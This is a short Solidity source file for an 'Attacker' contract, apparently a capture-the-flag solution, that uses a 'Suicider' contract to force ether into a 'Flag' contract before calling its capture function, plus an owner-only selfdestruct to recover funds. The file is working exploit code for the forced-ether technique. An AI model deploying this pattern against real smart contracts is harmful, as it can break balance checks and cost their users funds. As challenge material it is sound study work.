pragma solidity 0.4 .24;
import "./Suicider.sol";
import "./Flag.sol";
contract Attacker {
    Suicider suicider;
    Flag flag;
    address owner;
    constructor(address _suiciderAddr, address _flagAddr) public {
        suicider = Suicider(_suiciderAddr);
        flag = Flag(_flagAddr);
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(owner == msg.sender);
        _;
    }

    function attack(bytes32 rights) public payable {
        uint beforeBal = address(this).balance;
        suicider.sneakUpon.value(msg.value)(address(flag));
        flag.capture(rights);
        uint afterBal = address(this).balance;
        require(beforeBal == afterBal);

    }

    function takeback() public onlyOwner {
        selfdestruct(msg.sender);
    }

    function () public payable {

    }
}
